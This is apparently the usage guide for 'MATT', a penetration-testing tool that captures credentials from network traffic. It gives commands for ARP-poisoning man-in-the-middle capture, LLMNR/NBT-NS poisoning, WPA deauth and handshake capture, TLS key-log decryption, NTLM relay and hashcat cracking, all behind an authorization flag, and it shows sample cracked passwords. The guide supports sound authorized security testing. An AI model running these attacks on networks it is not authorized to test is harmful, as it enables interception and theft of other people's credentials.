# Using MATT

A practical walkthrough. For install, see **[INSTALL.md](INSTALL.md)**; for the
design, see **[README.md](README.md)**.

MATT has two stages and the split is the whole point:

1. **capture** — pull raw bytes off the wire into `capture_report.json`
2. **analyze** — decode those bytes into hashcat-ready candidates and
   plain-English findings, then (optionally) **crack** them to plaintext

A default run opens no socket and costs zero tokens. Only `--use-model` can
reach the network, and only the `--crack` step runs hashcat.

## The menu (just run `matt`)

Run `matt` with no arguments in a terminal and you get a colour menu:

```
  [1]  Analyze a capture file        offline, no root, zero network, zero tokens
  [2]  Live passive capture          sniff an interface only -- needs root
  [3]  Live MITM capture             ARP-poison + sniff -- needs root + authorization
  [4]  Crack a capture with hashcat  recover plaintext from the findings
  [5]  About / how it works
  [q]  Quit

  key:  credential found   cracked / network / danger   nothing
```

The colour key tells you how to read the output: **green** = a credential was
found, **red** = something cracked / a network call / a destructive action,
**dim** = nothing of note.

Everything the menu does is also a plain command, below — the menu just builds
the same command for you, so the two can never drift apart.

## 1. Analyze a capture (offline, safe, free)

No root, no network, no tokens. This is the default job.

```bash
matt --analyze-only capture_report.json --pretty
```

Output is one block per credential, each headed by **source host → where the
credential goes**, so a report full of credentials never gets mixed up:

```
[+] 10.0.4.50 (intranet.corp.local)  ->  intranet.corp.local/portal/login
    ...authenticated to intranet.corp.local/portal/login over http as 'msmith'...
```

Try it right now on the shipped example:

```bash
matt --analyze-only examples/enterprise_capture.json --pretty
```

## 2. Live passive capture (sniff only)

Needs root and an interface. Poisons nothing — it only listens.

```bash
sudo matt --iface wlan0 --no-poison --i-have-written-authorization --duration 30
```

- `--duration N` — seconds to sniff (default 30).
- `--capture-tool tcpdump|tshark` — force a capture tool (otherwise tcpdump,
  then tshark).
- It writes `capture_report.json` and `matt_analysis.json`, reassembling each
  packet from its hex dump so multi-packet credentials (NTLMv2, HTTP logins,
  PMKID) survive.

## 3. Live MITM capture (ARP poison)

The full "man at the top": ARP-poison the segment, then sniff. **Needs root, an
existing `--iface`, and `--i-have-written-authorization`** — all three are
checked before anything is opened.

```bash
sudo matt --iface wlan0 --duration 60 --i-have-written-authorization
```

- `--gateway IP` — override the auto-detected default gateway.
- `--dry-run` — print exactly what would run, touch nothing.

> ARP poisoning rewrites other people's traffic. Only run it on a network you
> are authorized to test.

### Decrypt HTTPS with a TLS key log (`--keylog`)

Encrypted TLS can be read when the browser or app writes its session secrets to
a key log file (`SSLKEYLOGFILE`). MATT hands that file to tshark, which decrypts
the matching sessions and feeds the plaintext to the same decoders.

```bash
export SSLKEYLOGFILE=$HOME/keys.log        # set before starting the browser/app
sudo matt --iface wlan0 --duration 60 --i-have-written-authorization \
     --keylog $HOME/keys.log
```

- The raw capture is saved as `matt-live.pcap` beside the report.
- Decryption runs after the capture window, using every key line written up to
  then. A session whose handshake began before the window cannot be decrypted.
- Needs `tshark` and `tcpdump`.

## 4. Crack this now (hashcat)

Turn the captured hashes into real passwords. Add `--crack` to any analyze or
live run, or pick `[4]` in the menu.

```bash
# analyze a report and immediately crack the findings
matt --analyze-only capture_report.json --crack

# with a specific wordlist (default is /usr/share/wordlists/rockyou.txt)
matt --analyze-only capture_report.json --crack --wordlist /path/to/wordlist.txt

# live capture, then crack
sudo matt --iface wlan0 --i-have-written-authorization --crack
```

It groups the findings by hashcat mode, runs hashcat once per mode, and maps any
recovered plaintext back to the exact user and destination:

```
=== crack this now (hashcat) ===
  [CRACKED] jdoe @ 10.0.4.25 (WKS-FINANCE-07)  (ntlmv2 -m 5600)  =  Password1
  [CRACKED] msmith @ intranet.corp.local/portal/login  (md5 -m 0)  =  Summer2026!
  [  --  ] (no user) @ corp-wifi (SSID CORP-WIFI)  (wpa-pmkid -m 16800)  -- not in wordlist
  cracked 2/3.
```

Notes:
- `--crack-timeout N` caps each hashcat run (default 300s) so a slow WPA mode
  can't hang forever.
- WPA/PMKID (`-m 16800`/`22000`) is PBKDF2 and slow on CPU — give it a targeted
  wordlist, not all of rockyou, unless you have time.
- rockyou ships gzip'd on Kali: `sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz`.

## 5. Optional: LLM-written prose

By default stage 2 prose is written locally (free, offline). `--use-model` is
the **only** thing in MATT that opens a socket, and only when you pass it:

```bash
export ANTHROPIC_API_KEY=sk-ant-...
matt --analyze-only capture_report.json --use-model --allow-default-endpoint
```

## A table of every credential (`--table`)

`--table` prints one compact row per credential — host, target, user, type, and
the secret (the cleartext password, or the cracked plaintext with `--crack`) —
so a big capture is scannable at a glance. Raw non-credential packets are left
out:

```
  HOST      TARGET          USER       TYPE  SECRET / CRACKED
  --------  --------------  ---------  ----  ----------------
  the wire  -               fieldtech  ftp   Winter#2026
  the wire  sso.corp.local  dwallace   md5   -
```

## Pipe the results into other tools (`--json`)

`--json` prints the analysis as JSON to stdout (banner and human summary
suppressed), so you can pipe it into `jq`, a SIEM, or your own scripts:

```bash
matt --analyze-only capture_report.json --json | jq '.findings[] | {host, target, username, kind}'
```

With `--crack` it folds any recovered `plaintext` into the JSON too.

## What it recovers

- **Hashes to crack:** NetNTLMv2 (`-m 5600`, with the **target server name** read
  from the blob, e.g. `→ FILESERVER01`), NetNTLMv1 (`5500`), WPA PMKID (`16800`),
  WPA handshake (`22000`), **Kerberos AS-REP roast (`18200`)** and **TGS-REP /
  kerberoast (`13100`, with the SPN as the target)**, and bare MD5/SHA-1/SHA-256.
- **Cleartext secrets (no cracking needed):** FTP (`220`) / POP3 (`+OK`) via
  `USER`/`PASS`, IMAP (`LOGIN`), SMTP (`AUTH PLAIN`), LDAP simple bind, SNMP
  v1/v2c community strings, telnet (`login:`/`Password:`), and HTTP Basic / form
  posts. The secret was on the wire in the clear, so MATT reports it as recovered.

## Identify and reverse a hash (`--identify`)

```bash
matt --identify 5f4dcc3b5aa765d61d8327deb882cf99
```
names the likely types (MD5, NTLM, MD4, LM, …) with their hashcat modes, and if
the hash is a common password it is **reversed instantly** (built-in rainbow
table, no network, no brute force). Captured unsalted hashes are reversed
automatically too — a weak MD5/NTLM login shows its password in the table for
free.

## Active response (`--watch`)

Point MATT at a directory and it analyzes every new capture as it lands — handy
when another process drops captures on a schedule:

```bash
matt --watch /engagements/live --table --crack
```

## Deciphering without brute force

In order of preference: (1) **capture the cleartext** — MATT does this for every
protocol above, so there is nothing to crack; (2) **relay instead of crack** —
NetNTLMv2/v1 can be relayed (`ntlmrelayx`) to authenticate as the user without
the password; (3) **rainbow-table lookup** for *unsalted* hashes (MD5, NTLM,
SHA-1) — instant for known passwords, useless on salted ones; (4) **`--crack`**
(hashcat wordlist + rules), which is a dictionary attack, not exhaustive brute
force. MATT never needs AI for any of this — a default run is deterministic
standard-library code; `--use-model` is the only optional AI step.

## Reading the output / exit codes

- `matt_analysis.json` holds every finding: `kind`, `hashcat_mode`, `candidate`,
  `host`, `target`, `username`, `prose`, plus counts.
- Exit codes: `0` ok, `2` config/refused (a gate failed), `3` live-capture
  error, `4` model misconfigured.

## Honesty

MATT never claims to have cracked a password until hashcat actually does. Until
then it says *"candidate recovered, hashcat mode N, awaiting offline crack"* —
because that is what happened.

## WPA/WPA2 handshake capture (`--wpa`)

With a monitor-mode adapter and the aircrack-ng suite + hcxtools installed:

```bash
sudo matt --iface wlan1 --wpa --bssid AA:BB:CC:DD:EE:FF --channel 6 \
  --deauth 5 --i-have-written-authorization
```

It puts the adapter in monitor mode, locks the AP's channel, captures, sends a
short deauth to force a reconnect, and converts the handshake to hashcat 22000.
`--dry-run` prints the exact plan without touching the air.

## Live dashboard in the terminal (`--dashboard`)

```bash
matt --dashboard /engagements/live        # live table in the terminal
```

A live, auto-refreshing table right in your terminal (no browser). Point it at
the directory `--watch` writes to for a live view of credentials as captures
land. Add `--web` only if you specifically want a local web page instead.

## LLMNR / NBT-NS poisoning (`--llmnr`)

Answer Windows name-resolution fallbacks (LLMNR UDP 5355, NBT-NS UDP 137) with
your own address so a victim's next auth comes to you, where MATT's NetNTLMv2
decoder catches it. Same gate as the ARP poison:

```bash
sudo matt --llmnr --iface wlan0 --our-ip 10.0.4.100 --duration 60 \
  --i-have-written-authorization
# then, in another terminal, capture the auth it funnels to you:
sudo matt --iface wlan0 --no-poison --i-have-written-authorization
```

`--dry-run` prints the plan without binding anything. Authorized networks only.

## Install from a package

```bash
./packaging/build-deb.sh && sudo dpkg -i matt_*_all.deb   # Debian/Kali/Ubuntu
# Arch/AUR: use packaging/PKGBUILD
```
